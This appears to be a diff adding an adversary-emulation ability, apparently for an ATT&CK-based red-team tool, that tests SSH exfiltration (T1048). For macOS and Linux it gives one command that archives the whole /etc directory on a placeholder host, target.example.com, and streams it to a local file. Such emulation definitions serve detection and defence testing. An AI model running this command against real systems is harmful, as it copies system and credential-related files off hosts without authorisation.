@@ -1,0 +1,18 @@
+---
+
+- id: tacexfil-1048-AR00-1v00-200120184608
+  name: Exfiltration Over Alternative Protocol - SSH
+  description: .      Input a domain and test Exfiltration over SSH.  .      Remote to Local.  
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    darwin:
+      sh:
+        command: |
+          ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+    linux:
+      sh:
+        command: |
+          ssh target.example.com "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
